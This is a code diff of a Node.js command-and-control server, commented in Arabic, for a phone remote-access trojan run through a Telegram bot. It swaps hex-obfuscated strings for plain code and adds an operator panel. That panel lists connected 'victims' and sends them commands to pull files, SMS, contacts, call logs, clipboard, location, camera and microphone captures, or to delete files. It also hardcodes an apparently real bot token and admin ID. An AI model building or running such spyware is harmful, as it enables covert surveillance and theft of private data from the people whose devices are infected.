@@ -1,10 +1,14 @@
-// --- (1) المكتبات الأصلية المشفرة ---
-var _0x52ef=["\x65\x78\x70\x72\x65\x73\x73","\x77\x73","\x68\x74\x74\x70","\x6E\x6F\x64\x65\x2D\x74\x65\x6C\x65\x67\x72\x61\x6D\x2D\x62\x6F\x74\x2D\x61\x70\x69","\x75\x75\x69\x64","\x6D\x75\x6C\x74\x65\x72","\x62\x6F\x64\x79\x2D\x70\x61\x72\x73\x65\x72","\x61\x78\x69\x6F\x73"];
-const express=require(_0x52ef[0]);const webSocket=require(_0x52ef[1]);const http=require(_0x52ef[2]);const telegramBot=require(_0x52ef[3]);const uuid4=require(_0x52ef[4]);const multer=require(_0x52ef[5]);const bodyParser=require(_0x52ef[6]);const axios=require(_0x52ef[7]);const fs = require('fs');
+// --- (1) المكتبات الأساسية ---
+const express = require("express");
+const webSocket = require("ws");
+const http = require("http");
+const telegramBot = require("node-telegram-bot-api");
+const uuid4 = require("uuid").v4;
 
-// --- (2) الإعدادات الخاصة بك (تم التعديل) ---
-const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20'; // التوكن الخاص بك
-const ADMIN_ID = 6568145373; // ايديك الخاص
+// --- (2) الإعدادات الذهبية للمطور @A_l_k_w_r_y ---
+const token = '8531140296:AAGGyJqPaVSiRWTEUbrG1fmEsfLHVWELV20';
+const ADMIN_ID = 6568145373; 
+const DEV_USER = "@A_l_k_w_r_y";
 
 const app = express();
 const server = http.createServer(app);
@@ -12,60 +16,115 @@ const wss = new webSocket.Server({ server });
 const bot = new telegramBot(token, { polling: true });
 
 let clients = [];
+let allowedUsers = [ADMIN_ID]; // قائمة المسموح لهم باستخدام البوت
 
-// --- (3) مصفوفة دوال الاختراق الأصلية ---
-var _0xcb8c=["\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x6A\x73\x6F\x6E","\x70\x6F\x73\x74","\x68\x74\x74\x70\x73\x3A\x2F\x2F\x61\x70\x69\x2E\x74\x65\x6C\x65\x67\x72\x61\x6D\x2E\x6F\x72\x67\x2F\x62\x6F\x74","\x2F\x73\x65\x6E\x64\x4M\x65\x73\x73\x61\x67\x65","\x63\x68\x61\x74\x5F\x69\x64","\x74\x65\x78\x74","\x2F\x73\x65\x6E\x64\x44\x6F\x63\x75\x6D\x65\x6E\x74","\x64\x6F\x63\x75\x6D\x65\x6E\x74","\x63\x61\x70\x74\x69\x6F\x6E","\x2F\x73\x65\x6E\x64\x41\x75\x64\x69\x6F","\x61\x75\x64\x69\x6F","\x2F\x73\x65\x6E\x64\x56\x69\x64\x65\x6F","\x76\x69\x64\x65\x6F","\x48\x54\x4D\x4C","\x70\x61\x72\x73\x65\x5F\x6D\x6F\x64\x65"];
+// --- (3) لوحة التحكم وإدارة الصلاحيات ---
+bot.on("message", (msg) => {
+    const id = msg.chat.id;
+    const user = msg.from;
+    const text = msg.text;
 
-// --- (4) لحظة الاختراق والتحكم (بالأزرار المعربة من الصورة) ---
+    // 1. نظام تعليق الغرباء (الموافقة اليدوية)
+    if (!allowedUsers.includes(id)) {
+        bot.sendMessage(ADMIN_ID, `🔔 <b>طلب دخول جديد!</b>\n\n👤 الاسم: <code>${user.first_name}</code>\n🆔 الايدي: <code>${id}</code>\n🔗 اليوزر: @${user.username || 'لا يوجد'}`, {
+            parse_mode: 'HTML',
+            reply_markup: {
+                inline_keyboard: [
+                    [{ text: "✅ السماح له", callback_data: `allow_${id}` }, { text: "❌ حظر", callback_data: `block_${id}` }]
+                ]
+            }
+        });
+        return bot.sendMessage(id, "⏳ <b>وصولك معلق..</b>\nطلبك قيد المراجعة من قبل المطور @A_l_k_w_r_y");
+    }
+
+    // 2. أوامر المطور الرئيسي (أنت فقط)
+    if (id === ADMIN_ID) {
+        if (text === "/start") {
+            bot.sendMessage(id, `👑 <b>لوحة تحكم الإمبراطور ( ${DEV_USER} )</b>\n\nالضحايا: <code>${clients.length}</code>\nالمستخدمين: <code>${allowedUsers.length - 1}</code>`, {
+                parse_mode: 'HTML',
+                reply_markup: {
+                    keyboard: [
+                        ["📱 عرض الضحايا", "👥 إدارة المستخدمين"],
+                        ["🚫 طرد مستخدم بالايدي", "📢 إذاعة عامة"],
+                        ["🔐 قفل البوت", "🔓 فتح البوت"]
+                    ],
+                    resize_keyboard: true
+                }
+            });
+        }
+
+        // ميزة الطرد عبر الايدي
+        if (text === "🚫 طرد مستخدم بالايدي") {
+            bot.sendMessage(id, "✍️ أرسل الآن (الايدي ID) للشخص المراد طرده:");
+            bot.once("message", (reMsg) => {
+                const targetId = parseInt(reMsg.text);
+                if (targetId === ADMIN_ID) return bot.sendMessage(id, "❌ لا يمكنك طرد نفسك!");
+                allowedUsers = allowedUsers.filter(u => u !== targetId);
+                bot.sendMessage(id, `✅ تم طرد <code>${targetId}</code> بنجاح.`, {parse_mode: 'HTML'});
+            });
+        }
+
+        if (text === "📱 عرض الضحايا") {
+            if (clients.length === 0) return bot.sendMessage(id, "❌ لا يوجد ضحايا متصلين.");
+            clients.forEach(c => {
+                bot.sendMessage(id, `📍 جـهاز: <code>${c.id}</code>\n🌍 IP: <code>${c.ip}</code>`, {
+                    parse_mode: 'HTML',
+                    reply_markup: { inline_keyboard: [[{ text: "🎮 لوحة التحكم بالضحية", callback_data: `control_${c.id}` }]] }
+                });
+            });
+        }
+    }
+});
+
+// --- (4) معالجة الأزرار (السماح + لوحة الاختراق من الصورة) ---
+bot.on("callback_query", (q) => {
+    const [action, value] = q.data.split("_");
+
+    if (action === "allow") {
+        allowedUsers.push(parseInt(value));
+        bot.sendMessage(value, "✅ تمت الموافقة! يمكنك استخدام البوت.");
+        bot.answerCallbackQuery(q.id, { text: "تم السماح" });
+    }
+
+    // لوحة الاختراق المعربة (طبق الأصل من الصورة)
+    if (action === "control") {
+        const victimId = value;
+        const controlButtons = {
+            inline_keyboard: [
+                [{ text: "📥 جلب ملف", callback_data: `getfile_${victimId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${victimId}` }],
+                [{ text: "📋 الحافظة (نسخ)", callback_data: `clip_${victimId}` }, { text: "🎙️ الميكروفون", callback_data: `mic_${victimId}` }],
+                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${victimId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${victimId}` }],
+                [{ text: "📍 الموقع الحالي", callback_data: `loc_${victimId}` }, { text: "💬 رسالة توست", callback_data: `toast_${victimId}` }],
+                [{ text: "📞 سجل المكالمات", callback_data: `calls_${victimId}` }, { text: "👥 قائمة الأسماء", callback_data: `contacts_${victimId}` }],
+                [{ text: "📳 اهتزاز الجهاز", callback_data: `vibrate_${victimId}` }, { text: "🔔 إظهار إشعار", callback_data: `notif_${victimId}` }],
+                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${victimId}` }, { text: "📤 إرسال رسالة", callback_data: `sendmsg_${victimId}` }],
+                [{ text: "🎵 تشغيل صوت", callback_data: `play_${victimId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${victimId}` }],
+                [{ text: "📢 إرسال للكل", callback_data: `msgall_${victimId}` }]
+            ]
+        };
+        bot.sendMessage(ADMIN_ID, `⚠️ <b>لوحة السيطرة على الضحية:</b> <code>${victimId}</code>`, {
+            parse_mode: 'HTML',
+            reply_markup: controlButtons
+        });
+    }
+
+    // إرسال الأوامر الفعلية للجهاز
+    const target = clients.find(c => c.id === value);
+    if (target && action !== "allow" && action !== "control") {
+        target.ws.send(JSON.stringify({ cmd: action }));
+        bot.answerCallbackQuery(q.id, { text: `🚀 جاري تنفيذ ${action}` });
+    }
+});
+
+// --- (5) اتصال الضحايا الجدد ---
 wss.on('connection', (ws, req) => {
     const deviceId = uuid4().substring(0, 8);
-    const ip = req.socket.remoteAddress;
-    clients.push({ id: deviceId, ws: ws });
+    const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
+    clients.push({ id: deviceId, ws: ws, ip: ip });
 
-    // رسالة الاختراق بنجاح
-    const hackAlert = `⚠️ <b>لقد اخترقت جهازاً بنجاح 🔥</b>\n\n` +
-                      `🆔 ايدي الجهاز: <code>${deviceId}</code>\n` +
-                      `🌍 عنوان الـ IP: <code>${ip}</code>\n\n` +
-                      `⚙️ <b>لوحة التحكم الشاملة (معربة):</b>`;
+    bot.sendMessage(ADMIN_ID, `⚠️ <b>لقد اخترقت جهازاً بنجاح 🔥</b>\n🆔 ايدي الجهاز: <code>${deviceId}</code>\n🌍 IP: <code>${ip}</code>`, { parse_mode: 'HTML' });
 
-    bot.sendMessage(ADMIN_ID, hackAlert, {
-        parse_mode: 'HTML',
-        reply_markup: {
-            inline_keyboard: [
-                [{ text: "📥 جلب ملف", callback_data: `getfile_${deviceId}` }, { text: "🗑️ حذف ملف", callback_data: `delfile_${deviceId}` }],
-                [{ text: "📋 الحافظة (نسخ)", callback_data: `clip_${deviceId}` }, { text: "🎙️ الميكروفون", callback_data: `mic_${deviceId}` }],
-                [{ text: "📸 كاميرا سيلفي", callback_data: `selfie_${deviceId}` }, { text: "📸 كاميرا رئيسية", callback_data: `maincam_${deviceId}` }],
-                [{ text: "📍 الموقع الحالي", callback_data: `loc_${deviceId}` }, { text: "💬 رسالة منبثقة", callback_data: `toast_${deviceId}` }],
-                [{ text: "📞 سجل المكالمات", callback_data: `calls_${deviceId}` }, { text: "👥 جهات الاتصال", callback_data: `contacts_${deviceId}` }],
-                [{ text: "📳 اهتزاز الجهاز", callback_data: `vibrate_${deviceId}` }, { text: "🔔 إظهار إشعار", callback_data: `notif_${deviceId}` }],
-                [{ text: "📩 سحب الرسائل", callback_data: `msgs_${deviceId}` }, { text: "📤 إرسال رسالة", callback_data: `sendmsg_${deviceId}` }],
-                [{ text: "🎵 تشغيل مقطع", callback_data: `play_${deviceId}` }, { text: "🔇 إيقاف الصوت", callback_data: `stop_${deviceId}` }],
-                [{ text: "📢 إرسال للكل", callback_data: `msgall_${deviceId}` }]
-            ]
-        }
-    });
-
-    ws.on('message', (data) => {
-        // يتم استقبال ومعالجة البيانات المسحوبة هنا
-    });
-
-    ws.on('close', () => {
-        clients = clients.filter(c => c.id !== deviceId);
-    });
+    ws.on('close', () => { clients = clients.filter(c => c.id !== deviceId); });
 });
 
-// --- (5) معالجة الأوامر ---
-bot.on("callback_query", (query) => {
-    const [action, devId] = query.data.split("_");
-    const target = clients.find(c => c.id === devId);
-
-    if (!target) return bot.answerCallbackQuery(query.id, { text: "❌ الجهاز غير متصل" });
-
-    target.ws.send(JSON.stringify({ cmd: action }));
-    bot.answerCallbackQuery(query.id, { text: `🚀 جاري تنفيذ: ${action}` });
-});
-
-// --- (6) تشغيل النظام ---
-server.listen(process.env.PORT || 3000, () => {
-    console.log("Hacking System Running with your IDs 🚀");
-});
+server.listen(process.env.PORT || 3000, () => { console.log(`System Online for ${DEV_USER}`); });
